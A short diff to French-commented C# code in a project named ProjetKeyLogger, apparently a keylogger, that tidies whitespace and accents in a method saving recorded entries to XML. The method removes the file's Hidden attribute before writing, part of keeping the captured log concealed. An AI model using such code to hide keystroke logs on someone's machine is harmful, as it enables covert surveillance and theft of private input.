@@ -55,17 +55,15 @@ namespace ProjetKeyLogger
             list_enregistrement.Add(enregistrement);
         }
 
-
         //sauvegarde dans un fichier XML
         public void saveToXml(string file_path)
         {
-            
             //On vérifie si le fichier existe
             if (File.Exists(file_path))
             {
-                //Recupere les attributs du fichier
+                //Recupère les attributs du fichier
                 FileAttributes attributs = File.GetAttributes(file_path);
-                //on enleve le statut caché pour pouvoir ecrire dans le fichier
+                //on enlève le statut caché pour pouvoir ecrire dans le fichier
                 attributs = RemoveAttribute(attributs, FileAttributes.Hidden);
                 //Modifie les attributs du fichier après avoir ete réinitialisé
                 File.SetAttributes(file_path, attributs);
@@ -104,9 +102,5 @@ namespace ProjetKeyLogger
             //On retourne la collection créée
             return collection_enregistrement;
         }
-
-  
-
-
     }
 }
